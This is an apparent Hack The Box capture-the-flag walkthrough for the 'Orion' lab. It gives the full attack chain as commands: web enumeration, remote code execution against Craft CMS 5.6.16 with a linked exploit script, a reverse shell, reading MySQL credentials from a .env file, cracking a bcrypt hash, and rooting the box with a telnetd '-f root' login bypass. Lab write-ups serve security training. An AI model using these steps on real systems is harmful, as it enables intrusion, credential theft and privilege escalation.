# Hack The Box Labs: Orion


This lab exploits Craft CMS version 5.6.16, the CSV-2025-32432 has a Base Score of 10.0, and allows for remote code execution (RCE). From there and exposed MySQL passwd allows us to switch to a users. We can also exploit Telnet 2.7 with CVE-2026-24061, Base Score 9.8, to get root access.

https://nvd.nist.gov/vuln/detail/CVE-2025-32432

https://github.com/c0gnit00/CVE-2025-32432

https://nvd.nist.gov/vuln/detail/CVE-2026-24061



# Recon:

Lets start with an nmap scan:

	nmap 10.129.77.211 -sV -sC 

- Our scan reveals that there are 2 open TCP ports, 22 and 80.

Since weve got a website lets add the ip to the hosts file:

	echo '10.129.77.211 orion.htb' | sudo tee -a /etc/hosts

After clicking through the website we see that its very light, theres a form at the bottom that fails to send a request due to a missing API, and theres no links to other webpages.

This page doesnt seem to provide us with any attack surfaces, so enumerate the website and see what we can find:

NOTE: Be careful when fuzzing, if you overload the server you'll get a "No space left on device" error. If this happens you'll need to reset the machine.

	ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://orion.htb/FUZZ -e .php,.sh,.jpg,.jpeg,.png,.html,.txt,.bak,.js -mc all -fc 404,403

- From from this we've found a few other pages, lets start by going to http://orion.htb/admin

Notice that at the bottom there is a version for a Content Management System (CMS), Craft CMS 5.6.16.



# Exploit:

If we search for Craft CMS 5.6.16 on the web, we can find CVE-2025-32432

Note:

- The exploit involves writing to a log file, some CVEs use a path that will not work for this machine.

- The path /var/lib/php/sessions/sess_<sessionID> was found to work in this instance.


A working exploit script can be found at: https://github.com/c0gnit00/CVE-2025-32432

- Thankfully for us, c0gnit00 modified the exploit specificly for this CTF.

Lets test out the script and try to get RCE:

	./exploit.py -u http://orion.htb/ -c 'id'

- Which returns:

		uid=33(www-data) gid=33(www-data) groups=33(www-data)

Now that we've got RCE, lets get a shell on the server:

- First setup the listener:

		nc -nlp 5555

- Then use the provided shell.sh script to connect to the server:

		./exploit.py -u http://orion.htb/ -c "$(cat shell.sh)"



# Privilege Escalation:

Now that we've got a shell, lets see what network services are listening for connections:

	ss -tlpn

- This reveals 2 new services that we didnt see with our nmap scan because they were not exposed to the outside world.

	
	- MySQL on port 3306


Lets first investigate MySQL.

- If we try to run the mysql command, we'll be denided. So lets try to find a password.

First let's look around in our starting directory, which leads us here:

	ls -la html/craft/

If we list all files, including the hidden ones, we'll find .env, which this file contains login credentials for mysql.

	cat /var/www/html/craft/.env


We can now use the mysql command. First lets enumerate the databases:

	mysql -u root -p'SuperSecureCraft123Pass!' -e 'show databases;'

Lets see whats in orion:

	mysql -u root -p'SuperSecureCraft123Pass!' -e 'SHOW TABLES FROM orion;'

Theres a users table. Lets access it:

	mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, admin, email, password FROM orion.users;"

Now we've got a hash, lets crack it. But first we'll need to determine what kind of hash it is and what hashcat mode to use, so we'll run:

	hashid -m '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'

- As we see, its a Blowfish cipher, and the Hashcat mode is 3200.

Lets use rockyou.txt as our wordlist:

	tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /tmp/

Now we can try to crack it:

	hashcat -m 3200 hash.txt /tmp/rockyou.txt

- Looks like they chose a simple passwd, its:

		darkangel


Going back to the MySQL data, the username was admin, but the listed email was adam@orion.htb, lets the use the passwd we just earned to login as adam:

	ssh adam@10.129.77.211

- We're in!

Next we can get the user flag with:

	cat user.txt



Now that we've exploited MySQL, lets move on to Telnet. 

First, well determine which version we are working with:

	telnet -V

- If we search for CVEs for Telnet 2.7, we'll find CVE-2026-24061.

CVE-2026-24061 describes a telnetd vulnerability that allows remote authentication bypass USER environment variable is set to "-f root".

Lets set the environment variable USER to "-f root", and then call telnet with the automatic login flag (-a). This will tell telnet to check the inherited envorinment where it finds the USER variable.

	USER="-f root" telnet -a localhost

Now that we are root, lets get the final flag:

	cat /root/root.txt

